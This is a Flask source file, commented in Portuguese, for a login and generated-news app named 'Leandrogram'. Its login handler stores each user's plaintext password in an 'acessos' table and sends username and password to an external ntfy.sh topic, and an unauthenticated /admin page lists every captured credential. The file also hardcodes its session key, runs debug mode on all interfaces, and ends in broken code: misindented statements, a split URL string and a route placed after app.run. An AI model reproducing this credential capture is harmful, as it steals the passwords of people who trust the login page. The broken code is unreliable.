from flask import Flask, request, redirect, render_template_string, session
from datetime import datetime, timedelta
import requests
import sqlite3
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = 'leandrogram-super-secreto-123459'  # Chave para sessões (mude depois)
app.permanent_session_lifetime = timedelta(days=7)   # Fica logado por 7 dias

BASE = ''  # Termux

# ==================== BANCO DE DADOS ====================
def get_db():
    conn = sqlite3.connect('leandrogram.db')
    conn.row_factory = sqlite3.Row
    return conn

def iniciar_banco():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS acessos (
        id INTEGER PRIMARY KEY, usuario TEXT, senha TEXT, data TEXT)''')
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        usuario TEXT UNIQUE NOT NULL,
        senha TEXT NOT NULL,
        nome TEXT,
        data_nascimento TEXT,
        data_cadastro TEXT
    )''')
    conn.commit()
    conn.close()
    print("Banco de dados verificado/criado com sucesso!")

# ==================== FUNÇÕES AUXILIARES ====================
def salvar_acesso(usuario, senha):
    conn = get_db()
    cursor = conn.cursor()
    agora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    cursor.execute('INSERT INTO acessos (usuario, senha, data) VALUES (?, ?, ?)',
                   (usuario, senha, agora))
    conn.commit()
    conn.close()

def notificar(usuario, senha):
    try:
        requests.post('https://ntfy.sh/leandrogram-leandro',
            data=f'Alguém acessou!\nUsuário: {usuario}\nSenha: {senha}'.encode('utf-8'))
    except:
        pass

# ==================== ROTAS ====================

@app.route('/')
def login():
    if 'usuario' in session:  # Se já estiver logado, vai direto pro jornal
        return redirect('/jornal')
    
    cadastro_sucesso = request.args.get('cadastro') == 'sucesso'
    erro_login = request.args.get('erro') is not None
    return render_template_string(open('/home/leandrogram/Leandrogram/login.html').read(), 
                                  cadastro_sucesso=cadastro_sucesso, 
                                  erro_login=erro_login)

@app.route('/cadastro')
def cadastro_page():
    if 'usuario' in session:
        return redirect('/jornal')
    erro_usuario = request.args.get('erro') == 'usuario_existente'
    return render_template_string(open('/home/leandrogram/Leandrogram/cadastro.html').read(), 
                                  erro_usuario=erro_usuario)

@app.route('/registrar', methods=['POST'])
def registrar():
    usuario = request.form['usuario']
    senha = request.form['senha']
    nome = request.form.get('nome', '')
    data_nasc = request.form.get('data_nascimento', '')
    
    senha_hash = generate_password_hash(senha)
    
    try:
        conn = get_db()
        cursor = conn.cursor()
        agora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        
        cursor.execute('''
            INSERT INTO usuarios 
            (usuario, senha, nome, data_nascimento, data_cadastro)
            VALUES (?, ?, ?, ?, ?)
        ''', (usuario, senha_hash, nome, data_nasc, agora))
        
        conn.commit()
        conn.close()
        return redirect('/?cadastro=sucesso')
        
    except sqlite3.IntegrityError:
        return redirect('/cadastro?erro=usuario_existente')

@app.route('/entrar', methods=['POST'])
def entrar():
    usuario = request.form['usuario']
    senha = request.form['senha']
    
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM usuarios WHERE usuario = ?', (usuario,))
    user = cursor.fetchone()
    conn.close()
    
    if user and check_password_hash(user['senha'], senha):
        session['usuario'] = usuario          # ← Aqui cria a sessão
        session['nome'] = user['nome']
        session['data_nascimento'] = user['data_nascimento']
        salvar_acesso(usuario, senha)
        notificar(usuario, senha)
        return redirect('/jornal')
    else:
        return redirect('/?erro=1')

@app.route('/jornal')
def jornal():
    if 'usuario' not in session:
        return redirect('/')
    
    nome = session.get('nome', session.get('usuario', 'Usuário'))
    # Renderiza com Jinja
    html = open('/home/leandrogram/Leandrogram/jornal.html').read()
    return render_template_string(html, nome=nome)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/perfil')
def perfil():
    if 'usuario' not in session:
        return redirect('/')
    return redirect('/jornal')

# ==================== ROTAS ANTIGAS ====================
@app.route('/admin')
def admin():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM acessos ORDER BY id DESC')
    acessos = cursor.fetchall()
    conn.close()
    return render_template_string(open('/home/leandrogram/Leandrogram/admin.html').read(), acessos=acessos)


# ==================== INICIALIZAÇÃO ====================
iniciar_banco()



if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')

@app.route('/gerar-jornal')
def gerar_jornal():
    if 'usuario' not in session:
        return redirect('/')
    
    import requests, json, os
    
    data_nasc = session.get('data_nascimento', '')
    api_key = os.environ.get('GEMINI_API_KEY')
    
    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?
key={api_key}"
    
    prompt = f"""Gere 5 notícias reais e importantes que aconteceram no dia {data_nasc} ao longo da história. 
Responda APENAS em JSON válido, sem texto extra, neste formato:
[{{"titulo": "", "resumo": "", "categoria": "Brasil", "fonte": "", "tempo": "{data_nasc}", "curtidas": 120, "url": ""}}]
Categorias: Tech, Brasil, Esporte, Mundo, Saude"""

    body = {"contents": [{"parts": [{"text": prompt}]}]}
    
import time
time.sleep(2)
resp = requests.post(url, json=body)
    
resp = requests.post(url, json=body)
    texto = resp.json()['candidates'][0]['content']['parts'][0]['text']
    texto = texto.replace('```json', '').replace('```', '').strip()
    noticias = json.loads(texto)
    
    session['noticias'] = noticias
    return redirect('/jornal')
